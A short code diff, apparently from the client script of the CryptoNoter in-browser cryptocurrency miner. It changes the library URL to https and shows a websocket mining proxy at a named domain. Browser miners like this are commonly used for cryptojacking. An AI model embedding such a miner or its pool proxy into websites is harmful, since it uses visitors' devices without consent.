@@ -515,7 +515,7 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "//%CryptoNoter_domain%/lib/",
+    LIB_URL: "https://%CryptoNoter_domain%/lib/",
     WEBSOCKET_SHARDS: [["wss://m.prominer.online/proxy"]],
     // WEBSOCKET_SHARDS: [["ws://%CryptoNoter_domain%/proxy"]],
     CAPTCHA_URL: "//%CryptoNoter_domain%/captcha/",
